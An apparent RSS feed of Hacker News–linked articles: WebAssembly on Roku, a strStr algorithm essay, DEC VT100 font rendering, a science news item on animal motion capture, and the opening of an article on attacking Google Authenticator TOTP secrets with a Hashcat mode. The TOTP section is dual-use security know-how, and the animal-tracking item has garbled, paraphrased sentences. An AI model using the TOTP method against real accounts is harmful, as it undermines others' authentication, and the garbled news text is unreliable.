<pre data-enlighter-language="visualbasic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">Function I32Load(mem as Object, index as Integer) as Integer
    Return mem[index] + (mem[index + 1] &lt;&lt; 8) + (mem[index + 2] &lt;&lt; 16) + (mem[index + 3] &lt;&lt; 24)
End Function</pre>



<p>Luckily BrightScript has logical bit-shift built in and I was able to read 4 bytes and shift them all into place. At the time, I didn’t realize that BrightScript also had the bitwise-or operator (literally <code>Or</code>) as I tried the typical C <code>|</code> operator and it failed, so I opted to use <code>+</code> instead.</p>



<h2>Testing Instructions</h2>



<p>What became immediately clear was that I needed a way to know whether my WASM instruction implementations were correct. For example, unsigned i32 division is different than signed i32 division, and BrightScript only supported signed integral types. How would I know my implementation was correct without coming up with all the pathological cases to test?</p>



<p>Again, <a href="https://github.com/WebAssembly/wabt">wabt</a> to the rescue! It was by luck that I noticed they had a sub-repository <a href="https://github.com/WebAssembly/testsuite">WebAssembly/testsuite</a> which contained a massive set of WebAssembly .wast files that tested the behavior of each instruction. For those familiar with WebAssembly, a .wast is just a .wat file with extra syntax for testing. For example, you could test the unsigned i32 division by using the test file <em>i32.wast</em>:</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">(assert_return (invoke "div_u" (i32.const 1) (i32.const 1)) (i32.const 1))
(assert_return (invoke "div_u" (i32.const 0) (i32.const 1)) (i32.const 0))
(assert_return (invoke "div_u" (i32.const -1) (i32.const -1)) (i32.const 1))
(assert_return (invoke "div_u" (i32.const 0x80000000) (i32.const -1)) (i32.const 0))
(assert_return (invoke "div_u" (i32.const 0x80000000) (i32.const 2)) (i32.const 0x40000000))
(assert_return (invoke "div_u" (i32.const 0x8ff00ff0) (i32.const 0x10001)) (i32.const 0x8fef))
(assert_return (invoke "div_u" (i32.const 0x80000001) (i32.const 1000)) (i32.const 0x20c49b))
(assert_return (invoke "div_u" (i32.const 5) (i32.const 2)) (i32.const 2))
(assert_return (invoke "div_u" (i32.const -5) (i32.const 2)) (i32.const 0x7ffffffd))
(assert_return (invoke "div_u" (i32.const 5) (i32.const -2)) (i32.const 0))
(assert_return (invoke "div_u" (i32.const -5) (i32.const -2)) (i32.const 0))
(assert_return (invoke "div_u" (i32.const 7) (i32.const 3)) (i32.const 2))
(assert_return (invoke "div_u" (i32.const 11) (i32.const 5)) (i32.const 2))
(assert_return (invoke "div_u" (i32.const 17) (i32.const 7)) (i32.const 2))</pre>



<p>After implementing <code>assert_return</code> in BrightScript and creating a framework that read .wast files using the <em>wast2json</em> tool, I had a way to progress forward:</p>



<pre data-enlighter-language="visualbasic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">result = test0_div_u(1%,1%) ' i32.wast(87) current.json(50)
AssertEquals(result, 1%)
result = test0_div_u(0%,1%) ' i32.wast(88) current.json(51)
AssertEquals(result, 0%)
result = test0_div_u(4294967295%,4294967295%) ' i32.wast(89) current.json(52)
AssertEquals(result, 1%)
result = test0_div_u(2147483648%,4294967295%) ' i32.wast(90) current.json(53)
AssertEquals(result, 0%)
result = test0_div_u(2147483648%,2%) ' i32.wast(91) current.json(54)
AssertEquals(result, 1073741824%)
result = test0_div_u(2414874608%,65537%) ' i32.wast(92) current.json(55)
AssertEquals(result, 36847%)
result = test0_div_u(2147483649%,1000%) ' i32.wast(93) current.json(56)
AssertEquals(result, 2147483%)
result = test0_div_u(5%,2%) ' i32.wast(94) current.json(57)
AssertEquals(result, 2%)
result = test0_div_u(4294967291%,2%) ' i32.wast(95) current.json(58)
AssertEquals(result, 2147483645%)
result = test0_div_u(5%,4294967294%) ' i32.wast(96) current.json(59)
AssertEquals(result, 0%)
result = test0_div_u(4294967291%,4294967294%) ' i32.wast(97) current.json(60)
AssertEquals(result, 0%)
result = test0_div_u(7%,3%) ' i32.wast(98) current.json(61)
AssertEquals(result, 2%)
result = test0_div_u(11%,5%) ' i32.wast(99) current.json(62)
AssertEquals(result, 2%)
result = test0_div_u(17%,7%) ' i32.wast(100) current.json(63)</pre>



<p>My mission became clear: work through each .wast file and implement all the instructions until 100% of the tests pass.</p>



<h2>Unsigned i32 Operations</h2>



<p>One thing that I learned is that there is no difference between unsigned and signed addition (I believe due to the <a href="https://en.wikipedia.org/wiki/Two%27s_complement">Two’s Complement</a>, but don’t quote me on that). For example if you were to take the expression:</p>



<pre><code>-123 + 20 = -103</code></pre>



<p>Reinterpret the first two operands as unsigned you would get:</p>



<pre><code>FFFFFF85 + 00000014</code></pre>



<p>When added they result in:</p>



<pre><code>FFFFFF99</code></pre>



<p>Which if you reinterpret that back as signed you get:</p>



<pre><code>-103</code></pre>



<p>However, the same cannot be said for unsigned division which is exactly why WebAssembly has the <em>i32.div_u</em> and <em>i32.div_s</em> instructions. In the land of unsigned, it’s very clear to see that:</p>



<pre><code>00000001 / FFFFFFFF = 00000000</code></pre>



<p>The number 00000001 (or just 1) divided by a very large number of 0xFFFFFFFF is clearly 0 due to integer division. However if you reinterpret those same operands as i32 signed values, you get:</p>



<pre><code>1 / -1 = -1</code></pre>



<p>This presents us with a problem: BrightScript does not have unsigned primitives and therefore does not have a way to run an unsigned i32 division operation. It’s time to get clever… Trevor (I make no apologies for this).</p>



<p>We can take advantage of the fact that the entire range of an unsigned i32 fits within a signed i64. The tricky part is in BrightScript, all conversions from Integer to LongInteger are done via sign extension. That means that the value 0xFFFFFFFF would turn into 0xFFFFFFFFFFFFFFFF, because 0xFFFFFFFF interpreted as signed is -1, and -1 in 64 bit is 0xFFFFFFFFFFFFFFFF.</p>



<p>There is a simple fix: we use <em>bitwise and</em> to discard the high 4 bytes and keep only the low 4 bytes after performing the sign extension. This …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://motley-coder.com/2020/12/20/webassembly-on-roku/">https://motley-coder.com/2020/12/20/webassembly-on-roku/</a></em></p>]]>
            </description>
            <link>https://motley-coder.com/2020/12/20/webassembly-on-roku/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25523336</guid>
            <pubDate>Wed, 23 Dec 2020 23:06:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unconscious Algorithms]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25523329">thread link</a>) | @droctothorpe
<br/>
December 23, 2020 | https://droctothorpe.github.io/posts/2020/12/unconscious-algorithms/ | <a href="https://web.archive.org/web/*/https://droctothorpe.github.io/posts/2020/12/unconscious-algorithms/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <p>The goal of this article is to convey an approach to solving data structure and
algorithm problems. My hope is that it helps you in a situation where you might
otherwise draw a blank.</p>
<p>I want to start by stating an obvious but important truth: your brain is
<strong>amazing</strong>. You are constantly and rapidly solving unimaginably complex
problems that make even the most challenging FAANG whiteboard interview look
like a stroll in the park. Steven Pinker expresses this idea eloquently in <em>How
The Mind Works</em>:</p>
<blockquote>
<p>“…the gap between robots in imagination and in reality…shows the first
step we must take in knowing ourselves: appreciating the fantastically complex
design behind feats of mental life we take for granted. The reason there are
no humanlike robots is not that the very idea of a mechanical mind is
misguided. It is that the engineering problems that we humans solve as we see
and walk and plan and make it through the day are far more challenging than
landing on the moon or sequencing the human genome. Nature, once again, has
found ingenious solutions that human engineers cannot yet duplicate. When
Hamlet says, “What a piece of work is a man! how noble in reason! how infinite
in faculty! in form and moving how express and admirable!” we should direct
our awe not at Shakespeare or Mozart or Einstein or Kareem Abdul-Jabbar but at
a four-year old carrying out a request to put a toy on a shelf.”</p>
</blockquote>
<p>Pinker goes on to say that the “faculty with which we ponder the world has no
ability to peer inside itself or our other faculties to see what makes them
tick.” I beg to differ. In Pinker’s defense, he may be using hyperbole to
accentuate his point.</p>
<p>We are all students of the mind – simultaneously scientist and lab rat. When we
make consciousness the subject of consciousness, we can pull back the veil and
bear witness to the built-in algorithms that are otherwise taken for granted.</p>
<p>This process can be leveraged to help demystify data structure and algorithm
questions. Let’s walk through a specific problem to illustrate the concept.</p>
<blockquote>
<p>Implement strStr().</p>
<p>Return the index of the first occurrence of needle in haystack, or -1 if needle
is not part of haystack.</p>
<p>For the purpose of this problem, we will return 0 when needle is an empty
string.</p>
</blockquote>
<p>Source: <a href="https://leetcode.com/problems/implement-strstr/">https://leetcode.com/problems/implement-strstr/</a></p>
<p>First and foremost, you need example input. If it’s not provided by default,
either ask for it or define your own inputs.</p>
<p>In this case, Leetcode provides us with example input:</p>
<pre><code>Example 1:
Input: haystack = "hello", needle = "ll"
Output: 2
</code></pre><p><strong>Resist</strong> the temptation to write code.</p>
<p>This stage is not about coding, it’s about observing and deconstructing how your
mind arrives at a solution.</p>
<p>Can you determine, at a glance, whether or not “hello” contains “ll”? Of course
you can. It does. This conclusion seems to materialize instantaneously, doesn’t
it? It also seems to require little to no effort. Take a moment here to
appreciate just how effective your mind is at this task.</p>
<p>The operative question is: how? More specifically, how <strong>does</strong> your mind solve it?
The crux of this article is that you should focus on that question as opposed
to the categorically different question of: how <strong>should</strong> you solve this?</p>
<p>When I slow down and observe how my mind tackles this problem, I arrive at the
following deconstruction. It seems as if my mind identifies the length of the
needle, then iterates through the haystack, making needle-sized chunks as it
goes, comparing each chunk to the needle for equality.</p>
<p>Practically speaking, it looks something like this:</p>
<p>Does “he” equal “ll”? No.</p>
<p>Does “el” equal “ll”? No.</p>
<p>Does “ll” equal “ll”? Yes!</p>
<p>Now it’s just a matter of identifying the matching index, which is 2.</p>
<p>Simple enough, right?</p>
<p>We can probably dissect it further using three pointers but for the sake of
brevity I’ll sidestep the added complexity.</p>
<p>Now that we have a proposed explanation for how the mind solves this problem,
translating it into code is comparatively trivial.</p>
<p>Avoid premature optimization at this stage. Sometimes, the mind’s approach is
efficient; other times it is inefficient and you can improve on it. Either way,
defer optimization. First make it work, then make it better. An inefficient
solution is better than no solution.</p>
<p>Here is a pretty simple implementation of the process outlined above in Python.</p>
<div><pre><code data-lang="python"><span>class</span> <span>Solution</span>:
    <span>def</span> <span>strStr</span>(self, haystack: str, needle: str) <span>-&gt;</span> int:
        haystack_length <span>=</span> len(haystack) <span>-</span> <span>1</span>
        needle_length <span>=</span> len(needle) <span>-</span> <span>1</span>
        i <span>=</span> <span>0</span>

        <span>while</span> i <span>&lt;=</span> haystack_length <span>-</span> needle_length: 
            <span>if</span> haystack[i:i <span>+</span> needle_length <span>+</span> <span>1</span>] <span>==</span> needle:
                <span>return</span> i
            i <span>+=</span> <span>1</span>
            
        <span>return</span> <span>-</span><span>1</span>
</code></pre></div><p>In a nutshell, this implementation starts at the first element of haystack,
creates a needle-sized slice, and compares the slice to the needle for equality.
If equality is confirmed, it returns the index. If not, the index is iterated
and the slice and comparison is repeated starting from the next element. This
process continues until an equality check succeeds or the index reaches
<code>haystack_length - needle_length</code>, since any slice past that point will not be
long enough to match the needle in size.</p>
<p>The time and space complexity are both O(n).</p>
<p>I hope you found this helpful. Remember: your brain is amazing. If you can solve
a problem without code, you already know the solution, it’s just a matter of
unboxing it.</p>

    </div></div>]]>
            </description>
            <link>https://droctothorpe.github.io/posts/2020/12/unconscious-algorithms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25523329</guid>
            <pubDate>Wed, 23 Dec 2020 23:05:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Raster CRT Typography (According to Dec)]]>
            </title>
            <description>
<![CDATA[
Score 79 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25523322">thread link</a>) | @dcminter
<br/>
December 23, 2020 | https://www.masswerk.at/nowgobang/2019/dec-crt-typography | <a href="https://web.archive.org/web/*/https://www.masswerk.at/nowgobang/2019/dec-crt-typography">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
		<article role="article">
		
		<time datetime="2019-02-20">February 20, 2019</time>
		<p>A closer look at the glyphs drawn by the DEC terminals VT100 and VT220.</p>
		<p><span>R</span>ecently, I engaged in a bit of analog media emulation, namely for the purpose of the reenactment of raster CRT graphics as seen on “glass terminals” like the iconic VT-series by the Digital Equipment Corporation (DEC). An endeavor, which raises a few questions, like, is there anything special to the media, what did the fonts really look like, and can we reconstruct them from specifications? </p>

		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-crt-typography.png" alt="VT100 Series CRT Typography" width="800" height="800">
			<figcaption><em>(Not a DEC manual.)</em></figcaption>
		</figure>

		<p>Thanks to a tiny wealth of technical information available on the web, at sites like <a href="https://vt100.net/dec/vt220/glyphs" target="_blank" rel="noopener">vt100.net</a> and <a href="http://bitsavers.org/pdf/dec/terminal/" target="_blank" rel="noopener">bitsavers.org</a>, determining the look of these fonts should be easy. E.g., we may reconstruct the glyphs from the terminals’ ROMs. This way, we should be able to determine their exact forms. There are even TrueType-fonts available, meant to recreate the typography of the VT220, “<a href="http://sensi.org/~svo/glasstty/" target="_blank" rel="noopener">Glass TTY VT220</a>,” including scanlines, and “<a href="https://www.dafont.com/dec-terminal-modern.font" target="_blank" rel="noopener">DEC Terminal Modern</a>” with modernized, smooth outlines:</p>


		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-vt220-ttf.png" alt="VT220 TrueType fonts" width="710" height="415">
			<figcaption>Modern TrueType fonts recreating the glyphs of the VT220.<br>Mind that the VT-terminals supported two resolution modes, one at 132 characters per line and one at 80 characters (char-matrix 9×10 and 10×10, respectively), the latter introducing an extra spacing of one pixel.</figcaption>
		</figure>

		<p>Having a closer look at the two fonts, there are some notable differences (the differences in spacing may be explained by the two characters per line modes of the VT-terminals), however, neither looks right. Comparing them to photos of the similar VT100, there are discernible differences, not only in the font weight, but also in the size and form of the conters and the overal “feel” of the font. However, the apparent confusion about the weight of the font isn’t especially helped by photos of the real thing either, as the impression conveyed by them differs widely by lens, exposure and camera settings used:</p>

		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-vt100-adventure.jpg" alt="VT100 displaying Adventure / Colossal Cave." width="900" height="627">
			<figcaption>VT100 displaying Adventure / Colossal Cave<cite>Photo: <a href="https://en.wikipedia.org/wiki/File:Vt100-adventure.jpg" target="_blank" rel="noopener">Wikipedia, Dave Fischer</a>, 2008, Wikimedia Commons (edited, N.L.).</cite></figcaption>
		</figure>

		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-vt100-dir.jpg" alt="VT100 displaying a directory listing." width="900" height="702">
			<figcaption>VT100 displaying a directory listing<cite>Photo: <a href="https://www.flickr.com/photos/54568729@N00/9636183501" target="_blank" rel="noopener">Jason Scott</a>, 2013, Creative Commons (edited, N.L.).</cite></figcaption>
		</figure>

		<p>Since photos aren’t much of a help here either, it may be time for a look at the…</p>

		<h2>ROMs</h2>

		<p>Since ROMs are available, we may start there, since they are the closest, we may get, to the real thing, aren’t they? What could possibly go wrong?</p>

		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-roms.png" alt="VT100 and VT220 separated characters as in ROM" width="558" height="410">
			<figcaption><p>Separated ROM readings of the VT100 (left) and the VT220 (right).<br><cite>VT220 separation by Paul Flo Williams, <a href="https://vt100.net/dec/vt220/glyphs" target="_blank" rel="noopener">vt100.net</a> (2008). VT100 complemented by me, N.L.</cite></p>
			<p>Character definitions differ for “a”, “c”, “g”, “2”, “6”, “7”, “9”, “@”, “%”, “{”, “}”, “|”, “°” and in the forms of the control characters (␉ ␍ ␊ ␤ ␋). Moreover, there are additional characters on the VT220.</p></figcaption>
		</figure>

		<p>Now, this doesn’t look right either. Obviously, the glyphs will be rendered stretched vertically to about double height, but there’s more going on here. The characters just don’t look right. P.e., have a closer look at “p” and “q” or the offset in the dots of the downward right stroke of “k”, not to speak of the funny digits “6” and “9” of the VT100 or the distorted “2”! Moreover, at a closer look, the character matrix is just 8×10, while we expected at least 9×10 (and 10×10 for 80-cols mode) — as described in the specifications. Clearly, this is not what is displayed on the screen.</p>

		<h2>Phosphor</h2>
		<p>Let’s have another look at the manuals, specifically at the “<a href="https://vt100.net/docs/vt100-tm/ek-vt100-tm-002.pdf" target="_blank" rel="noopener">VT100 Series Technical Manual</a>” <cite>(2<sup>nd</sup> edition, EK-VT100-TM-002; DEC, Maynard, Massachsetts, Aug. 1979)</cite>. As we learn there, it’s all about phosphor latency:</p>

		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-phosphor-flanks.png" alt="VT100 and VT220 phosphor latency" width="743" height="390">
			<figcaption><p>Pulse widths and phosphor activation flanks for the VT100 and VT200.<br><cite>(VT100 Series Technical Manual, EK-VT100-TM-002, p. 4-78)</cite></p>
			<p>Mind that the flanks of the signal pulses are highly idealized and will be also sloped in analog real life.</p></figcaption>
		</figure>

		<p>The time it takes for the phosphor to become fully activated is actually longer than the pulse representing the timing to draw a single pixel (40 nanoseconds). Meaning, if we were to attempt to display just a single pixel, the phosphor on this particular spot will never reach its full activation level resulting in a fuzzy image of varying brightnesses between dimmer, thin strokes and heavier, thick strokes. So the typography has to adjust for this, by streching the pulses to double width (80 ns), at least, in order to provide an even image and legible text and to work around the shallow flanks of the screen intensification.</p>

		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-monitor-repsonse.png" alt="VT100 and VT220 monitor response" width="800" height="250">
			<figcaption>Single and double pixel-widths, pulse timing and phosphor activation.<br><cite>(As above, re-edited N.L.)</cite></figcaption>
		</figure>

		<h2>Dot Stretching Circuitry</h2>
		<p>To provide for this, the VT-terminals employ a special technique, called <em>dot stretching:</em> The individual rows of a character matrix as in ROM are modified on-the-fly by prolonging any pulses for an active pixel for yet another pixel. Where there’s a single pixel in ROM, there will be two on the screen, where there are two in a row, there will be three displayed. (This is equivalent to OR-ing a word with itself by an offset of one pixel or bit to the right.)</p>
		<p>By this, our 8×10 matrix extends to the expected 9×10 (or 10×10 for the 80-columns mode, where the last pixel, which is set only for the line-drawing characters, will be stretched for yet another pulse.)</p>

		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-dot-stretching.png" alt="VT100 and VT220 dot streching" width="830" height="376">
			<figcaption>Dot streching on the VT100 and VT200.<br><cite>(VT100 Series Technical Manual, EK-VT100-TM-002, p. 4-78)</cite></figcaption>
		</figure>

		<p>However, this will provide different results for normal character size and double-width characters! Thanks to the wonders of dot stretching, there are two distinct fonts in one, each of them specially suited for the display size by the amount of detail exhibited!</p>

		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-dot-stretching-flanked.png" alt="VT100 and VT220 dot streching" width="410" height="410">
			<figcaption><p>1) as in ROM<br>
			2) single width with dot stretching<br>
			3) double width with dot stretching<br>
			4) single width with dot stretching and latency (flanks)<br>
			5) double width with dot stretching and latency (flanks)</p>
			<p><cite>(1, 2 &amp; 3 by Paul Flo Williams, <a href="https://vt100.net/dec/vt220/glyphs" target="_blank" rel="noopener">vt100.net</a>, 4 &amp; 5 added by me, N.L.)</cite></p></figcaption>
		</figure>

		<p>It’s crucially the image given in (2), representing dot streching, which provides the blocky, rather bold strokes found in modern representation of the font. However, if we add the sine- and cosine-like ramps of the flanks of the rising and dropping phosphor activation (compare 4 &amp; 5 and the timing diagram above), we arrive at a closer rendition of the screen image (mind that the VT100 and VT220 are said to expose quite discernible scanlines).</p>

		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-character-rendering.png" alt="VT100 and VT220 screen rendering" width="300" height="182">
			<figcaption><p>VT220 character samples (80-columns mode).<br>1) as in ROM<br>
			2) normal size with dot stretching<br>
			3) rising and dropping phosphor flanks applied<br>
			4) phosphor bleed added</p>
			<p>Mind, how the conters “open up” in 4 and 5.</p>
			<p><cite>(1 &amp; 2 by Paul Flo Williams, <a href="https://vt100.net/dec/vt220/glyphs" target="_blank" rel="noopener">vt100.net</a>, 3 &amp; 4 and negative image added by me, N.L.)</cite></p></figcaption>
		</figure>

		<p>As we may say, a rather extreme example of the media instructing typographical forms, or, <em>vice versa,</em> the glyph design working by the media and its specific technological constraints to arrive at the desired typography. Having a look at the effects of phosphor activation, latency and bleed, we may also understand, why individual photos of VT-terminal screens show varying font weights, according to the exposure in respect to the brightness of the monitor, while an overall smoothness of the font is still preserved.</p>
		
		<p>And here is another representation of the ROM-separations (compare the image above) with effects applied, providing a closer impression of the screen rendition:</p>
		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-glyphs-color.png" alt="VT100 and VT220 glyphs" width="320" height="430">
			<figcaption>Apparent glyphs: VT100 (left) and VT220 (right).</figcaption>
		</figure>
		<p>The double-width screen characters of the VT100 as compared to their normal, single-width appearance (black on white and as perceived on a screen):</p>
		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-vt100-charwidths.png" alt="VT100 double width and single width glyphs" width="526" height="366">
			<figcaption>VT100 double width and single width characters.</figcaption>
		</figure>

		<h2>Workbench Images</h2>

		<p>And here are, finally, two images <em>”from the workbench”,</em> showing my own attempts to recreate the screen experience in a web browser (HTML5, canvas API). Yea, there may be a bit too much retro-blur, however, you get the idea:</p>

		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-fontdemo-vt100.png" alt="VT100 screen emulation" width="650" height="320">
			<figcaption>VT100 emulation (screenshot).</figcaption>
		</figure>

		<figure>
			<img src="https://www.masswerk.at/nowgobang/images/VTterm-fontdemo-vt220.png" alt="VT220 screen emulation" width="650" height="320">
			<figcaption>VT220 emulation (screenshot).</figcaption>
		</figure>

		<p>And that’s all for this episode…</p>


		
		

		<p><small><em>Discuss/comment on  <a href="https://news.ycombinator.com/item?id=19528618" target="_blank" rel="noopener">Hacker News</a> (oops, front page).</em></small></p>
		</article>

</div></div>]]>
            </description>
            <link>https://www.masswerk.at/nowgobang/2019/dec-crt-typography</link>
            <guid isPermaLink="false">hacker-news-small-sites-25523322</guid>
            <pubDate>Wed, 23 Dec 2020 23:05:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[3D “Capture” Technology Uncovers How Animals Move]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25523276">thread link</a>) | @voldemort1968
<br/>
December 23, 2020 | https://smosa.com/3d-capture-technology-uncovers-how-animals-move/ | <a href="https://web.archive.org/web/*/https://smosa.com/3d-capture-technology-uncovers-how-animals-move/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>

					<!-- .post-header -->


					<div>
						<p>Researchers at Harvard University have developed a new tool to help measure behaviors in animal movement.</p><p>The team ran their studies by combining their tool, CAPTURE, with neural recordings to describe the relationship between brain activity and behavior. They are also working with Google DeepMind to use CAPTURE to model animal behavior using deep neural networks.</p><p>"We had developed really elaborate approaches to study how the brain is disrupted in parkinsonian mice, but our ability to measure their behavioral deficits was a far cry from the nuanced ways we can assess the impact of Parkinson's on human behavior," said co-author Jesse D. Marshall. "It became clear to me that a major reason why so many drugs tested in mice don't translate to humans is that our ability to measure their effects on behavior is quite limited."</p><p>Marshall's obsession with the idea of CAPTURE started as a student working on Parkinson's Disease models in mice. Marshall was weary of the complexities and constraints involved with brain function in relation to the actions of an animal.</p><p>Animal behaviour is of significant interest to a wide range of fields, ranging from biology and psychology to ecology and pharmacology. Careful study of the behavior of laboratories helps researchers to simulate human disorders and to determine the efficacy of new drugs. A behavioral surveillance device blends motion capture with profound education to map the three-dimensional motions of free activities.</p><figure><img src="https://images.unsplash.com/photo-1593937505566-64f33d148915?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGxhYiUyMG1vdXNlfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="A scientist works in the laboratory" srcset="https://images.unsplash.com/photo-1593937505566-64f33d148915?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGxhYiUyMG1vdXNlfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1593937505566-64f33d148915?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGxhYiUyMG1vdXNlfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1593937505566-64f33d148915?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGxhYiUyMG1vdXNlfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1593937505566-64f33d148915?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDJ8fGxhYiUyMG1vdXNlfGVufDB8fHw&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@sdadsp?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Dmitriy Suponnikov</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>"In contrast to traditional motion capture in humans, which is done in short bursts, we collected data continuously, 24/7," said Marshall. "This allowed us to really quantify everything rats do in their normal lives -- an atlas for behavior."</p><p>Marshall spent six months working out how to repair markings for his creatures. He attempted tattoos, adhesives, and hair dyes before embarking on body-piercings. Team also studied how illness habits and medication responses shift.</p><p>Co-author Bence P. Ölveczky said, "Our lab studies how skilled movements are learned and generated by the brain. Traditionally, these studies are done by designing specific tasks and relating brain activity to simple behavioral readouts i.e. did the animal push this lever? Did the animal lick this port? Such observations tell us whether our rats solve the task, but says nothing about how they do it and that's exactly what we are interested in; how the brain learns and controls skilled movements. Getting at this required more precise and sophisticated readouts of behavior."</p><p>Scientists have long been suspecting that disturbed grooming may be used to model the motor stereotypes (repetitive movements and sons) The team is now conducting their research by integrating CAPTURE with neural recordings.</p>
					</div><!-- .post-content -->

					<!-- .post-footer -->


				</article></div>]]>
            </description>
            <link>https://smosa.com/3d-capture-technology-uncovers-how-animals-move/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25523276</guid>
            <pubDate>Wed, 23 Dec 2020 22:59:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Attacking Google Authenticator]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25523177">thread link</a>) | @1cvmask
<br/>
December 23, 2020 | https://unix-ninja.com/p/attacking_google_authenticator | <a href="https://web.archive.org/web/*/https://unix-ninja.com/p/attacking_google_authenticator">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>A story about RFC 6238</em></p>

<blockquote>
  <p><em>DISCLAIMER:</em> I hate to keep mentioning it, but please don't abuse this knowledge. There are enough malicious actors out there already. This article was written to try and help our  defenders of the realm to be more effective.</p>
</blockquote>

<p>Security models always seem to be great until they are not. The curious part is how many people seem to beg the question more often than not. It's easy to just blindly accept something as true without challenging it (such as the safety of a given model). As a community, we should support challenging perceptions and sharing knowledge with others.</p>

<p>At DefCon 26 I was drinking with some friends, discussing hashing and encryption, when the topic of <a href="https://tools.ietf.org/html/rfc6238">RFC 6238</a> came up. This RFC defines an open standard for Time-based One-Time Passwords (TOTP) to be used as a factor in authentication schemes. For the unfamiliar, it's pretty popular and widely supported. Many common multi-factor authentication mechanisms rely on implementing this spec (for example Google Authenticator, Duo Mobile, Authy, pyotp for python, and others.) But all of these services are only secure if the secret is confidential. Some people were convinced the TOTP implementations are flawed, and others were not. So can we break this security model by generating the same TOTP codes as a particular target?</p>

<p>After a bit of research and testing, I submitted attack mode <code>18100</code> to Hashcat.</p>

<blockquote>
  <p><em>NOTE:</em> I think the process for submitting any PR to the Hashcat project is fascinating. Mine have been worthwhile exercises in good coding practices and collaborative development. I would recommend others contribute to this project for the experience as well.</p>
</blockquote>

<h2>How does this work?</h2>

<blockquote>
  <p><em>NOTE:</em> I think the theories behind attacks are important, but if you don't care for the details just skip ahead to "Simulating an attack" in the next section.</p>
</blockquote>

<p>The RFC itself is fairly straight forward. It builds on a previous RFC for OTP, but uses a timestamp to create a derived counter.</p>

<p>We start with our secret. It's just a base32 encoded value. This really could be anything, but it seems that most implementations have standardized on defaulting to encoding a random 10 byte value. (This leaves us with 16 bytes of encoded text.)</p>

<p>We then take the HMAC of our counter, using our encoded secret as the key. Let's call the product of this <em><code>H</code></em>.</p>

<p>An offset is next calculated from the end bits of <em><code>H</code></em>, and we extract four bytes of the hash from that offset and convert them to an unsigned integer. Using our integer, we take the modulo of 10^<em><code>length</code></em> (where <em><code>length</code></em> is the number of digits you want in your resulting code; up to 10), and we now have our TOTP code.</p>

<p>Now, if we can reliably determine which secret generates the OTP code in question at a particular point in time we will have a practical attack. This means that we need at least two pieces of information:</p>

<ul>
<li>A TOTP code</li>
<li>The rough timestamp at which this code was generated</li>
</ul>

<p>The caveat here is that the reduction on the HMAC hash results in a large number of collisions for a single point in time. Between two points in time, the collisions seem to be unique, but we should have a duplicate for the real secret which created our codes.</p>

<h2>Simulating an attack</h2>

